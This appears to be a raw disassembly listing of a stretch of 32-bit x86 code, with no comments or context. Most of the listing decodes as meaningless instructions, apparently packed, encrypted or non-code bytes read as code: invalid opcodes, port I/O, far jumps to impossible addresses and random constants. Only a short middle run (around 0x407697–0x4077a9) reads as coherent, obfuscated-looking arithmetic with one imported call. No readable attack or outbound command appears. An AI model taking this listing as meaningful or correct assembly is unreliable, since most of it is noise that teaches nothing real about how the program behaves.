  4072d7:	mov    al,ds:0x9932f3bb
  4072dc:	and    bl,BYTE PTR [edi+0x6f]
  4072df:	fstp   DWORD PTR [edx+edx*2+0x1c536c86]
  4072e6:	inc    esp
  4072e7:	xlat   BYTE PTR ds:[ebx]
  4072e8:	mov    BYTE PTR [ebx],0x17
  4072eb:	call   DWORD PTR [ecx-0x58]
  4072ee:	loope  0x407320
  4072f0:	xor    al,0xf5
  4072f2:	xchg   esp,eax
  4072f3:	clc    
  4072f4:	stc    
  4072f5:	or     eax,0xd6c36dae
  4072fa:	jne    0x407292
  4072fc:	outs   dx,BYTE PTR ds:[esi]
  4072fd:	inc    esi
  4072fe:	stos   DWORD PTR es:[edi],eax
  4072ff:	ja     0x407369
  407301:	jle    0x407325
  407303:	mov    ebp,0x847fd471
  407308:	pop    eax
  407309:	fnclex 
  40730b:	and    DWORD PTR [edx],0x28
  40730e:	lods   eax,DWORD PTR ds:[esi]
  40730f:	mov    esp,0x72fb84fd
  407314:	mov    cl,0x33
  407316:	fs imul ebp,edx,0x25
  40731a:	xchg   ecx,eax
  40731b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40731c:	xchg   ebx,eax
  40731d:	lods   al,BYTE PTR ds:[esi]
  40731e:	fild   WORD PTR [eax]
  407320:	mov    bh,BYTE PTR ds:0x885ebe2c
  407326:	jns    0x407350
  407328:	test   eax,0x348f6211
  40732d:	jmp    0x973d76cc
  407332:	inc    edx
  407333:	sar    esp,0x4b
  407336:	ss (bad) 
  407338:	in     eax,0x69
  40733a:	jns    0x40731a
  40733c:	mov    cl,0xf9
  40733e:	fsubr  st,st(0)
  407340:	mov    cl,0x33
  407342:	test   BYTE PTR [esi+0x60],cl
  407345:	pop    ss
  407346:	xchg   ecx,eax
  407347:	outs   dx,BYTE PTR ds:[esi]
  407348:	ins    BYTE PTR es:[edi],dx
  407349:	outs   dx,DWORD PTR ds:[esi]
  40734a:	cmp    DWORD PTR [ebx+0x2],esp
  40734d:	fist   DWORD PTR [esi+0x46]
  407350:	jecxz  0x407387
  407352:	loopne 0x4073cb
  407354:	popa   
  407355:	jnp    0x407328
  407357:	mov    edi,0xc1305bb0
  40735c:	and    eax,0x8fa1a950
  407361:	push   ebx
  407362:	pop    edi
  407363:	adc    DWORD PTR [eax+0x3],ecx
  407366:	cmp    eax,0xf414ae0f
  40736b:	shl    DWORD PTR [edx-0x16f012d8],0x56
  407372:	stc    
  407373:	stc    
  407374:	jb     0x4073cd
  407376:	jbe    0x4073e2
  407378:	mov    ds:0x9a235acf,al
  40737d:	stos   BYTE PTR es:[edi],al
  40737e:	jge    0x407349
  407380:	mov    esi,0xe100b9b0
  407385:	xchg   ebx,eax
  407386:	stc    
  407387:	pop    eax
  407388:	ffree  st(6)
  40738a:	and    DWORD PTR [edi+0x70],ebp
  40738d:	jge    0x4073d0
  40738f:	pop    ds
  407390:	push   esi
  407391:	mov    fs,ebp
  407393:	mov    ebp,fs
  407395:	out    0x81,al
  407397:	out    dx,eax
  407398:	fild   QWORD PTR [ebp+0x2d]
  40739b:	loop   0x407338
  40739d:	mov    al,0xef
  40739f:	jne    0x407397
  4073a1:	fstp   QWORD PTR ds:0x4f92a060
  4073a7:	pushf  
  4073a8:	inc    esp
  4073a9:	sahf   
  4073aa:	retf   0x16d0
  4073ad:	adc    al,0xd7
  4073af:	fisttp DWORD PTR ds:0x695d52b3
  4073b5:	adc    bh,BYTE PTR fs:[ecx+ebp*1+0x4f]
  4073ba:	push   ebp
  4073bb:	dec    edi
  4073bc:	pop    ecx
  4073bd:	nop
  4073be:	fsubr  DWORD PTR [ebx]
  4073c0:	mov    eax,0xe7c6235
  4073c5:	and    cl,BYTE PTR [eax+0x78fc7845]
  4073cb:	push   eax
  4073cc:	sbb    dl,cl
  4073ce:	into   
  4073cf:	add    dl,BYTE PTR [esp+edx*2]
  4073d2:	imul   ebx,DWORD PTR [ebx-0x3f],0xb6aab667
  4073d9:	pusha  
  4073da:	jno    0x407445
  4073dc:	ins    DWORD PTR es:[edi],dx
  4073dd:	icebp  
  4073de:	rcl    ebx,1
  4073e0:	sub    eax,esp
  4073e2:	and    al,0x2a
  4073e4:	jnp    0x407455
  4073e6:	iret   
  4073e7:	jge    0x407397
  4073e9:	inc    ecx
  4073ea:	add    DWORD PTR ds:0x39e09e74,ebx
  4073f0:	xchg   DWORD PTR [ebp-0x2325fb08],esp
  4073f6:	xchg   ebp,eax
  4073f7:	out    dx,al
  4073f8:	add    bl,ah
  4073fa:	mov    bl,0xd9
  4073fc:	and    DWORD PTR [ebp+0x7e],ecx
  4073ff:	inc    esi
  407400:	pop    esi
  407401:	sbb    DWORD PTR [ebx+0xf],eax
  407404:	fwait
  407405:	int    0x66
  407407:	fneni(8087 only) 
  407409:	adc    bl,al
  40740b:	mov    bl,0x56
  40740d:	jge    0x40746b
  40740f:	es push ss
  407411:	cmp    al,0xec
  407413:	xchg   edx,eax
  407414:	fs stos DWORD PTR es:[edi],eax
  407416:	dec    ebx
  407417:	xchg   ecx,eax
  407418:	int3   
  407419:	scas   eax,DWORD PTR es:[edi]
  40741a:	and    bh,bl
  40741c:	(bad)
  407420:	or     BYTE PTR ds:0x1a3c9ff1,ah
  407426:	jl     0x4073b9
  407428:	xor    eax,0x83034d71
  40742d:	cmc    
  40742e:	and    DWORD PTR [eax],ebx
  407430:	fdiv   QWORD PTR [ebx+0x5ec9e8bb]
  407436:	mov    fs,WORD PTR [ecx+0x2d]
  407439:	jae    0x4074ab
  40743b:	mov    eax,ds:0x5d1384fd
  407440:	sub    ebp,0x5228487c
  407446:	push   edx
  407447:	mov    dh,BYTE PTR [edi-0x73]
  40744a:	xor    al,ch
  40744c:	in     al,0x6e
  40744e:	and    eax,eax
  407450:	adc    bl,dl
  407452:	push   es
  407453:	cmp    DWORD PTR [ecx],ecx
  407455:	sbb    DWORD PTR [eax+0x6],edi
  407458:	cmp    bl,BYTE PTR [esi-0x7b]
  40745b:	icebp  
  40745c:	je     0x407436
  40745e:	in     eax,0xa0
  407460:	ss adc eax,0x66e93df7
  407466:	call   0x893fa739
  40746b:	mov    bl,dl
  40746d:	pop    edx
  40746e:	jmp    0x657f:0x7184df04
  407475:	test   DWORD PTR [ecx+edi*8],eax
  407478:	cmp    bl,BYTE PTR [eax-0x6c]
  40747b:	mov    es,ebx
  40747d:	in     eax,0x8a
  40747f:	test   al,0x79
  407481:	cld    
  407482:	jmp    0xcaf7:0xa56dd75b
  407489:	push   ds
  40748a:	sub    edi,ebp
  40748c:	stos   BYTE PTR es:[edi],al
  40748d:	mov    edi,0x280e094
  407492:	sub    edi,DWORD PTR [ecx]
  407494:	dec    eax
  407495:	jmp    0x112e:0xd2dc553b
  40749c:	add    esi,ecx
  40749e:	xor    ebp,ebx
  4074a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4074a1:	ret    
  4074a2:	xchg   edi,eax
  4074a3:	stos   DWORD PTR es:[edi],eax
  4074a4:	ja     0x4074c4
  4074a6:	(bad)  
  4074a7:	fmul   st(0),st
  4074a9:	test   eax,0x900e9bd8
  4074ae:	rcl    bl,cl
  4074b0:	mov    BYTE PTR [ebx+0x15],dl
  4074b3:	sub    BYTE PTR [eax-0xb],0xf
  4074b7:	xchg   ecx,eax
  4074b8:	push   esp
  4074b9:	js     0x40749c
  4074bb:	pop    edx
  4074bc:	cwde   
  4074bd:	aad    0xde
  4074bf:	dec    ebx
  4074c0:	stos   BYTE PTR es:[edi],al
  4074c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074c2:	ja     0x40744d
  4074c4:	pop    ebx
  4074c5:	sbb    DWORD PTR [esi-0x56],edi
  4074c8:	add    al,0x23
  4074ca:	sub    al,0xdc
  4074cc:	retf   0x11c5
  4074cf:	fnstsw WORD PTR [eax+ebp*1]
  4074d2:	test   BYTE PTR [ecx-0x78946343],bh
  4074d8:	pop    ebp
  4074d9:	add    DWORD PTR [eax+edi*1-0x1ff02c92],0x12
  4074e1:	mov    bl,BYTE PTR [edi]
  4074e3:	xor    eax,0x97a3cf4
  4074e8:	and    ebp,DWORD PTR [edi+0x8]
  4074eb:	aas    
  4074ec:	sub    dh,BYTE PTR [eax-0x1c]
  4074ef:	xchg   edx,eax
  4074f0:	cmp    eax,DWORD PTR [edx+ebx*2]
  4074f3:	add    cl,ah
  4074f5:	call   DWORD PTR fs:[esp+edx*4]
  4074f9:	inc    ecx
  4074fa:	xchg   ebx,eax
  4074fb:	loope  0x407545
  4074fd:	inc    esp
  4074fe:	mov    ecx,ds
  407500:	xchg   DWORD PTR [edi-0x2],edx
  407503:	mov    DWORD PTR [ebx+0x59307b10],esp
  407509:	sub    ecx,DWORD PTR [eax]
  40750b:	push   edx
  40750c:	lea    eax,[esi-0x3a]
  40750f:	or     DWORD PTR [edx+ebp*1],0xeb8485e2
  407516:	pop    ebx
  407517:	xor    al,0x6f
  407519:	mov    esp,0x29200bad
  40751e:	cmp    al,0xc2
  407520:	jbe    0x407546
  407522:	lock mov eax,ds:0x4b1432d6
  407528:	inc    ebp
  407529:	adc    BYTE PTR [edi+0x7c584567],ah
  40752f:	call   0x8e8b50a3
  407534:	cwde   
  407535:	out    dx,eax
  407536:	scas   al,BYTE PTR es:[edi]
  407537:	mov    bl,BYTE PTR [edx]
  407539:	xchg   ebx,eax
  40753a:	loop   0x4075ae
  40753c:	mov    BYTE PTR [eax+0x2b],bl
  40753f:	test   al,0x1e
  407541:	nop
  407542:	xor    BYTE PTR [edx+0x1e],al
  407545:	das    
  407546:	inc    ebp
  407547:	jmp    0xd92fa0f9
  40754c:	xor    DWORD PTR [edx+0x3a],edi
  40754f:	aad    0xd6
  407551:	in     eax,dx
  407552:	hlt    
  407553:	inc    edx
  407554:	addr16 mov eax,ds:0xfbcb
  407558:	mov    BYTE PTR [eax],ah
  40755a:	(bad)  
  40755b:	dec    esp
  40755c:	test   DWORD PTR cs:[ecx],esp
  40755f:	cmp    al,BYTE PTR [edx+0x33375015]
  407565:	dec    ebx
  407566:	xchg   DWORD PTR [edi],ebx
  407568:	dec    edi
  407569:	sub    esi,DWORD PTR [edx+0x123e79d1]
  40756f:	iret   
  407570:	xor    dl,al
  407572:	mov    WORD PTR [edi],cs
  407574:	mov    ch,0x67
  407576:	lods   eax,DWORD PTR ds:[esi]
  407577:	scas   eax,DWORD PTR es:[edi]
  407578:	cmp    bh,dl
  40757a:	cmp    bl,BYTE PTR ds:0x13c56922
  407580:	stos   DWORD PTR es:[edi],eax
  407581:	retf   0x6cf3
  407584:	push   0x8dfdc9c6
  407589:	jo     0x407588
  40758b:	in     al,0xf4
  40758d:	push   ebp
  40758e:	sbb    dl,dl
  407590:	inc    edi
  407591:	mov    dh,0xd0
  407593:	lock or DWORD PTR [ebx+0xb8fd7a],0xffffff8a
  40759b:	in     eax,dx
  40759c:	js     0x4075bb
  40759e:	out    dx,al
  40759f:	cmp    ecx,DWORD PTR [esi]
  4075a1:	cmp    dh,BYTE PTR [edi-0x2d1e961e]
  4075a7:	pusha  
  4075a8:	mov    ds:0x71d707d0,eax
  4075ad:	dec    ebp
  4075ae:	pop    eax
  4075af:	mov    ds:0x2b784ffb,eax
  4075b4:	xchg   cl,cl
  4075b6:	sti    
  4075b7:	pop    edx
  4075b8:	dec    ebx
  4075b9:	ret    0xc0b1
  4075bc:	cmp    ah,cl
  4075be:	adc    BYTE PTR [esi-0x2224a671],bh
  4075c4:	pushf  
  4075c5:	jle    0x4075b8
  4075c7:	jmp    0xa4cb552d
  4075cc:	add    dl,BYTE PTR [ecx]
  4075ce:	fnstcw WORD PTR [eax+ebp*4+0x31ebfa7f]
  4075d5:	mov    ds:0x36572f3c,eax
  4075da:	push   esp
  4075db:	push   0xb680e0d2
  4075e0:	pop    ebp
  4075e1:	sub    BYTE PTR [edx-0x61],0x6
  4075e5:	and    edi,DWORD PTR [eax+0x43f2adf]
  4075eb:	ins    BYTE PTR es:[edi],dx
  4075ec:	push   ds
  4075ed:	iret   
  4075ee:	mov    ch,0x35
  4075f0:	or     eax,0xbe3c565e
  4075f5:	cmp    dh,bh
  4075f7:	mov    ebx,0x419b18a5
  4075fc:	pop    eax
  4075fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4075fe:	popa   
  4075ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407600:	jecxz  0x4075de
  407602:	cmp    al,0xe5
  407604:	popf   
  407605:	push   ss
  407606:	inc    ebp
  407607:	inc    esp
  407609:	loope  0x407654
  40760b:	(bad)  
  40760c:	or     ch,BYTE PTR [esi+0x6d84c7b8]
  407612:	cmp    DWORD PTR [eax],eax
  407614:	fbld   TBYTE PTR [eax]
  407616:	cmp    esp,DWORD PTR [ecx]
  407618:	or     BYTE PTR [eax+eax*1+0x3f],0xec
  40761d:	repz inc ecx
  40761f:	icebp  
  407620:	out    0x7f,al
  407622:	mov    ecx,0x9577486c
  407627:	inc    edx
  407628:	dec    edx
  407629:	cmp    DWORD PTR [di-0x1c6],eax
  40762e:	cld    
  40762f:	jl     0x4075cf
  407631:	ds in  eax,0x92
  407634:	repnz inc eax
  407636:	popa   
  407637:	aad    0xbe
  407639:	push   ss
  40763a:	ins    DWORD PTR es:[edi],dx
  40763b:	ret    
  40763c:	int3   
  40763d:	ins    DWORD PTR es:[edi],dx
  40763e:	fxch   st(6)
  407640:	(bad)  
  407641:	pushf  
  407642:	mov    ds:0xebe99cdc,al
  407647:	and    edi,DWORD PTR [ebp+ebx*8-0x3478d5fe]
  40764e:	mov    edi,0xcf06c713
  407653:	js     0x40762e
  407655:	inc    ebx
  407656:	dec    esp
  407657:	push   ecx
  407658:	xor    ecx,DWORD PTR [ebx]
  40765a:	push   esp
  40765b:	ins    DWORD PTR es:[edi],dx
  40765c:	or     al,BYTE PTR [ebx]
  40765e:	or     ebx,DWORD PTR [edi+eiz*2]
  407661:	inc    ebx
  407662:	imul   esi,DWORD PTR [edi-0x2e],0x24
  407666:	loop   0x407673
  407668:	cwde   
  407669:	imul   esp,DWORD PTR [edi-0x2b],0xf583cead
  407670:	cmp    BYTE PTR [ebx],ch
  407672:	dec    ebx
  407673:	test   eax,0xb549db0c
  407678:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407679:	sub    BYTE PTR [edi+0x10],bh
  40767c:	fs (bad) 
  40767e:	ss out 0xe3,al
  407681:	rol    BYTE PTR [esi],1
  407683:	sar    ah,0x9e
  407686:	test   DWORD PTR [edx-0x28169c51],ebp
  40768c:	sbb    BYTE PTR [esi+0x2],0xb3
  407690:	mov    ebx,0xc3b27cb6
  407695:	jne    0x40768b
  407697:	shr    edx,0x2
  40769a:	mov    DWORD PTR [ebp-0x1c],ecx
  40769d:	mov    ecx,DWORD PTR [ebp+0x18]
  4076a0:	sub    DWORD PTR ds:0x4229a6,0x425a
  4076aa:	mov    edx,DWORD PTR [ebp+0x1c]
  4076ad:	or     DWORD PTR ds:0x4228da,0x210e
  4076b7:	xor    DWORD PTR [ebp-0x1c],edi
  4076ba:	or     DWORD PTR ds:0x422962,0x4229ce
  4076c4:	xor    edx,edx
  4076c6:	or     edx,DWORD PTR [ebp-0x1c]
  4076c9:	or     DWORD PTR ds:0x4228ce,0x4229c2
  4076d3:	shl    ecx,0x1e
  4076d6:	dec    DWORD PTR ds:0x4228f2
  4076dc:	add    edx,DWORD PTR [ebp-0x2c]
  4076df:	add    DWORD PTR [eax],edx
  4076e1:	sbb    eax,0x3637
  4076e6:	mov    eax,DWORD PTR [esi]
  4076e8:	sub    DWORD PTR ds:0x42292a,ebx
  4076ee:	mov    ecx,DWORD PTR [esi+0x4]
  4076f1:	movzx  edx,BYTE PTR ds:0x42290a
  4076f8:	sub    edx,DWORD PTR ds:0x42292e
  4076fe:	mov    DWORD PTR ds:0x42290a,edx
  407704:	shrd   eax,ecx,0x2
  407708:	shr    ecx,0x2
  40770b:	sub    edx,edx
  40770d:	mov    ecx,DWORD PTR [esi]
  40770f:	cmp    DWORD PTR ds:0x422956,0x0
  407716:	mov    DWORD PTR ds:0x422992,0x518b
  407720:	mov    edx,DWORD PTR ds:0x4228ee
  407726:	mov    DWORD PTR ds:0x4229b6,0x962
  407730:	jmp    0x40778a
  407735:	mov    DWORD PTR ds:0x422992,0x300f
  40773f:	mov    DWORD PTR ds:0x42296a,0xfe3
  407749:	jne    0x407770
  40774f:	push   0x0
  407751:	push   0x5aa3
  407756:	push   0x671f
  40775b:	push   DWORD PTR [ebp-0x10]
  40775e:	call   DWORD PTR ds:0x42a178
  407764:	and    DWORD PTR ds:0x42296a,ecx
  40776a:	sub    edx,0x694d
  407770:	inc    edx
  407771:	adc    DWORD PTR ds:0x4228be,0x1a32
  40777b:	dec    edx
  40777c:	mov    edx,DWORD PTR ds:0x4229fe
  407782:	mov    edx,DWORD PTR [edx]
  407784:	xor    DWORD PTR ds:0x422922,edx
  40778a:	mov    edx,DWORD PTR [esi+0x4]
  40778d:	xor    eax,edi
  40778f:	shl    ecx,0x1e
  407792:	xor    edx,edx
  407794:	or     edx,eax
  407796:	xor    eax,eax
  407798:	add    eax,DWORD PTR ds:0x4229c2
  40779e:	adc    eax,DWORD PTR ds:0x42298e
  4077a4:	mov    ds:0x4229c2,eax
  4077a9:	jmp    0x407d33
  4077ae:	jle    0x407760
  4077b0:	fucomp st(4)
  4077b2:	sbb    DWORD PTR [eax-0x7c58e782],esp
  4077b8:	test   BYTE PTR [edx+0x726276c8],dh
  4077be:	mul    DWORD PTR [ebx+0x16]
  4077c1:	push   ss
  4077c2:	cmp    eax,0xa161604
  4077c7:	pop    esi
  4077c8:	xchg   esp,eax
  4077c9:	out    0xe3,al
  4077cb:	mov    dh,0x49
  4077cd:	nop
  4077ce:	adc    ebp,DWORD PTR ds:[ebp-0x4b710d2]
  4077d5:	mov    ecx,0x3eefade7
  4077da:	push   ecx
  4077db:	adc    BYTE PTR ds:0x82538bcf,dl
  4077e1:	dec    ecx
  4077e2:	and    eax,0xe811cfcc
  4077e7:	rol    ebp,1
  4077e9:	imul   ebp,ecx,0xd4db0808
  4077ef:	scas   al,BYTE PTR es:[edi]
  4077f0:	loope  0x407866
  4077f2:	repz mov al,0x1f
  4077f5:	inc    ecx
  4077f6:	fwait
  4077f7:	sub    eax,0xcc29ebbe
  4077fc:	daa    
  4077fd:	je     0x407831
  4077ff:	mov    ah,0x60
  407801:	aad    0x8a
  407803:	(bad)  
  407804:	pushf  
  407805:	sbb    ebx,DWORD PTR [ebx+0x63e6e284]
  40780b:	push   es
  40780c:	popa   
  40780d:	adc    BYTE PTR [ebp+ecx*8-0x451623ab],bl
  407814:	ja     0x407861
  407816:	or     DWORD PTR [ebp+0x4],ebp
  407819:	fstp   DWORD PTR [edx+edi*2]
  40781c:	fimul  WORD PTR [ecx+0xa]
  40781f:	mov    bh,0xce
  407821:	xor    DWORD PTR [esi+0x187de7a2],edx
  407827:	dec    eax
  407828:	and    cl,BYTE PTR [esi+0x47]
  40782b:	adc    DWORD PTR [esi-0x76dbda3c],0xffffff8b
  407832:	rol    DWORD PTR [eax],0xd1
  407835:	imul   edi,esi,0x28
  407838:	in     al,0x28
  40783a:	pop    ebx
  40783b:	add    cl,al
  40783d:	fcomp  QWORD PTR ds:0x33a47e10
  407843:	inc    ebx
  407844:	pusha  
  407845:	xchg   dh,al
  407847:	(bad)  
  407848:	pop    esi
  407849:	add    DWORD PTR [edi],ecx
  40784b:	dec    esi
  40784c:	and    al,BYTE PTR [ecx]
  40784e:	or     edi,DWORD PTR [eax+0x4c]
  407851:	mov    dh,0x2
  407853:	cmp    esi,esi
  407855:	fs sub ecx,ebp
  407858:	pop    edi
  407859:	jnp    0x4078c5
  40785b:	popf   
  40785c:	sub    ch,0x88
  40785f:	loopne 0x407853
  407861:	stc    
  407862:	popf   
  407863:	pusha  
  407864:	mov    dh,0xe0
  407866:	ret    0x28f4
  407869:	inc    esi
  40786a:	les    ebp,FWORD PTR [edx]
  40786c:	cmp    ch,dl
  40786e:	or     BYTE PTR [edi-0x51],dh
  407871:	jmp    0x9a91:0xa3defbbe
  407878:	loope  0x4078b8
  40787a:	cmp    ah,BYTE PTR [ecx+eiz*8]
  40787d:	push   es
  40787e:	jge    0x407819
  407880:	pop    esi
  407881:	addr16 mov edx,0xe6db4ce4
  407887:	shl    BYTE PTR [eax],cl
  407889:	adc    BYTE PTR [ebp+0x1f5e53a],dl
  40788f:	fsub   st,st(5)
  407891:	mov    ds:0xeaf723bf,al
  407896:	adc    dh,0x4b
  407899:	push   ss
  40789a:	lods   eax,DWORD PTR ds:[esi]
  40789b:	loop   0x40790a
  40789d:	inc    ebx
  40789e:	xchg   esi,eax
  40789f:	ret    
  4078a0:	mov    esi,0x926310f5
  4078a5:	adc    DWORD PTR [edi],ecx
  4078a7:	xor    eax,0xa45933d0
  4078ac:	xlat   BYTE PTR ds:[ebx]
  4078ad:	or     bl,BYTE PTR [esi]
  4078af:	(bad)  
  4078b0:	push   edi
  4078b1:	xor    DWORD PTR [edx-0x6f],esi
  4078b4:	adc    BYTE PTR [ebx+0x7c],ah
  4078b7:	loopne 0x4078b4
  4078b9:	imul   DWORD PTR [ecx-0x49]
  4078bc:	(bad)  
  4078bd:	aas    
  4078be:	mov    ah,0xe
  4078c0:	mov    ecx,0xfc041751
  4078c5:	add    esp,DWORD PTR [edi+0x41]
  4078c8:	sub    BYTE PTR [esi+0x1e],dl
  4078cb:	cmc    
  4078cc:	dec    edx
  4078cd:	jmp    0x4078d4
  4078cf:	rcl    DWORD PTR [esi+0x24],0x31
  4078d3:	inc    ebx
  4078d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4078d5:	mov    dl,0xde
  4078d7:	jmp    0x8c42:0x5dce9287
  4078de:	ins    DWORD PTR es:[edi],dx
  4078df:	(bad)  
  4078e0:	test   ah,0x77
  4078e3:	add    BYTE PTR [ecx],ah
  4078e5:	cs (bad) 
  4078e7:	fist   DWORD PTR [eax-0x5c99ab64]
  4078ed:	xchg   BYTE PTR [eax],ah
  4078ef:	adc    ebp,ecx
  4078f1:	cmp    BYTE PTR [eax-0x3e4270d9],0xb8
  4078f8:	aad    0x3e
  4078fa:	xchg   bh,ch
  4078fc:	mov    dl,0x67
  4078fe:	jle    0x40792d
  407900:	jle    0x407945
  407902:	stos   DWORD PTR es:[edi],eax
  407903:	and    ch,al
  407905:	imul   ah
  407907:	shl    DWORD PTR gs:[ecx],0x3e
  40790b:	or     dl,BYTE PTR [ecx+0x1e]
  40790e:	stos   BYTE PTR es:[edi],al
  40790f:	dec    ebx
  407910:	xor    eax,0x6280c300
  407915:	or     al,0xf
  407917:	inc    esi
  407918:	jp     0x4078f6
  40791a:	or     al,0x40
  40791c:	cmp    DWORD PTR [esi],ecx
  40791e:	mov    ebx,0x1e2db1e9
  407923:	xchg   ebp,eax
  407924:	mov    eax,ds:0x4eb1d613
  407929:	clc    
  40792a:	cwde   
  40792b:	fld    DWORD PTR ds:0x8e147689
  407931:	jb     0x4078ea
  407933:	xchg   edx,eax
  407934:	mov    ds:0xf716cd25,al
  407939:	jmp    0x407982
  40793b:	mov    ds:0xe2f11ef5,al
  407940:	fidivr DWORD PTR ds:[eax+0x5ab0444e]
  407947:	imul   edi,DWORD PTR ds:0xf7c8f82d,0xd95b5d2e
  407951:	ret    
  407952:	push   edx
  407953:	rcl    DWORD PTR [ebp-0x16aaf47a],cl
  407959:	aas    
  40795a:	ins    BYTE PTR es:[edi],dx
  40795b:	fstp   st(3)
  40795d:	xor    DWORD PTR [edi-0x27],esi
  407960:	push   0xffffffc3
  407962:	out    0x44,al
  407964:	mov    bh,0xfc
  407966:	test   BYTE PTR gs:[ebp+0x17dea01b],ch
  40796d:	sahf   
  40796e:	sbb    DWORD PTR [ecx-0x25a444a0],esi
  407974:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407975:	mov    al,0x99
  407977:	scas   al,BYTE PTR es:[edi]
  407978:	xchg   edx,eax
  407979:	loop   0x40793d
  40797b:	into   
  40797c:	cli    
  40797d:	movsx  esp,dh
  407980:	mov    ebp,DWORD PTR [eax-0x3d694182]
  407986:	mov    DWORD PTR [edi],esi
  407988:	mov    edi,0x6f503ecd
  40798d:	jge    0x4079e7
  40798f:	add    edx,eax
  407991:	mov    dl,0xde
  407993:	sub    al,0x96
  407995:	xchg   esi,eax
  407996:	mov    DWORD PTR [esi+edx*8-0x2346514f],ebp
  40799d:	(bad)  
  40799e:	adc    BYTE PTR [esi+eax*8],ch
  4079a1:	mov    bh,0x88
  4079a3:	or     esi,DWORD PTR [edx+ebp*2-0x5295eb78]
  4079aa:	fnsave [ebp+0x2514a826]
  4079b0:	mov    eax,DWORD PTR [edx+ebx*4]
  4079b3:	call   0xf0700975
  4079b8:	mov    bl,0x1d
  4079ba:	cmp    eax,DWORD PTR [edx]
  4079bc:	pusha  
  4079bd:	loop   0x407940
  4079bf:	push   eax
  4079c0:	jge    0x40796d
  4079c2:	sbb    BYTE PTR [esi-0x18781602],dh
  4079c8:	test   BYTE PTR [edi],cl
  4079ca:	pop    edi
  4079cb:	cmp    ebx,DWORD PTR [ebp-0x4fe5ac19]
  4079d1:	cmp    al,BYTE PTR [edi+0x3f]
  4079d4:	cmc    
  4079d5:	les    edx,FWORD PTR [edi-0x36]
  4079d8:	push   esp
  4079d9:	mov    ds:0xc65a2b22,eax
  4079de:	stos   DWORD PTR es:[edi],eax
  4079df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079e0:	inc    esi
  4079e1:	lea    esi,[eax-0x3e]
  4079e4:	mov    bh,0x51
  4079e6:	in     eax,0x3d
  4079e8:	test   DWORD PTR [ebx-0x6d78ccca],esi
  4079ee:	jmp    0x407992
  4079f0:	call   0xc847:0x5ac8b90f
  4079f7:	ffree  st(0)
  4079f9:	int3   
  4079fa:	ficom  WORD PTR [ebx+0x72]
  4079fd:	and    BYTE PTR [esi+0x36813c21],0x2
  407a04:	jns    0x4079af
  407a06:	mov    cl,0x78
  407a08:	or     cl,dl
  407a0a:	aad    0x33
  407a0c:	jle    0x4079cf
  407a0e:	jmp    0xede20d44
  407a13:	mov    esp,0x977c356c
  407a18:	xchg   ecx,eax
  407a19:	mov    ds:0xb0d374c8,eax
  407a1e:	aaa    
  407a1f:	cmp    BYTE PTR [eax+0x2d],ah
  407a22:	jmp    0x9ec95bcd
  407a27:	(bad)  [edx]
  407a29:	rcl    BYTE PTR [eax+ebx*2],cl
  407a2c:	call   DWORD PTR [edx+0x42a1063e]
  407a32:	inc    ecx
  407a33:	xchg   bl,cl
  407a35:	lss    ecx,FWORD PTR [ebx+0x25]
  407a39:	sub    eax,0xd689aa68
  407a3e:	cli    
  407a3f:	adc    BYTE PTR [esi-0x71],0xc8
  407a43:	gs pop ss
  407a45:	ins    BYTE PTR es:[edi],dx
  407a46:	cmc    
  407a47:	sub    DWORD PTR [ebp+0x480adf82],eax
  407a4d:	xor    dh,0xe7
  407a50:	(bad)
  407a54:	cmp    eax,0xafeebe65
  407a59:	pop    edi
  407a5a:	loope  0x407a39
  407a5c:	xchg   edx,eax
  407a5d:	mov    esi,DWORD PTR [ebp-0x55]
  407a60:	adc    ebp,DWORD PTR [ecx+0x5598b804]
  407a66:	xchg   ebx,eax
  407a67:	ds pop edi
  407a69:	ds adc dh,0x47
  407a6d:	adc    DWORD PTR [esi-0x64],0xed0c4c28
  407a74:	shl    BYTE PTR [edi-0x3b87524],0x26
  407a7b:	pop    ecx
  407a7c:	adc    ecx,DWORD PTR [edx-0x1a]
  407a7f:	sub    eax,DWORD PTR [ecx-0x63202b2c]
  407a85:	pop    edx
  407a86:	imul   esp,DWORD PTR [ebx],0xf2c2dbdd
  407a8c:	pause  
  407a8e:	rcr    BYTE PTR [ecx],cl
  407a90:	push   0xc2d560f0
  407a95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a96:	dec    eax
  407a97:	(bad)  
  407a98:	push   cs
  407a99:	out    dx,al
  407a9a:	arpl   WORD PTR [ebx],cx
  407a9c:	sbb    BYTE PTR [edx],ah
  407a9e:	sbb    al,0x1a
  407aa0:	(bad)  
  407aa2:	arpl   WORD PTR [ebx],sp
  407aa4:	hlt    
  407aa5:	jmp    0x407ad6
  407aa7:	xor    eax,0xff12989d
  407aac:	fwait
  407aad:	hlt    
  407aae:	pop    edx
  407aaf:	dec    bl
  407ab1:	dec    ebx
  407ab2:	adc    esp,DWORD PTR [eax-0x3d]
  407ab5:	loop   0x407afa
  407ab7:	mov    esp,0x4564889b
  407abc:	lea    ebp,[edi+0x20898848]
  407ac2:	mov    edi,0x41d1970c
  407ac7:	or     DWORD PTR [edx],edx
  407ac9:	jg     0x407ae4
  407acb:	mov    ss,WORD PTR [eax-0x7f5bd181]
  407ad1:	dec    edi
  407ad2:	les    esp,FWORD PTR [edx+0x3e10044b]
  407ad8:	mov    esp,0x58126766
  407add:	and    ah,BYTE PTR [edi-0x19]
  407ae0:	out    dx,eax
  407ae1:	push   0xed0dfa08
  407ae6:	cs inc edi
  407ae8:	in     al,dx
  407ae9:	ins    DWORD PTR es:[edi],dx
  407aea:	int    0x74
  407aec:	lea    edx,[ebx]
  407aee:	icebp  
  407aef:	aas    
  407af0:	cs leave 
  407af2:	mov    ?,eax
  407af4:	mov    esi,0xd2cbe89
  407af9:	mov    edi,0xea6c68b2
  407afe:	xor    eax,0x81375232
  407b03:	cld    
  407b04:	int3   
  407b05:	add    BYTE PTR [esi],0xc6
  407b08:	out    dx,al
  407b09:	xor    DWORD PTR [edi],edx
  407b0b:	xor    eax,0x7c15a542
  407b10:	arpl   WORD PTR ds:0x4f2ec816,si
  407b16:	push   esi
  407b17:	aas    
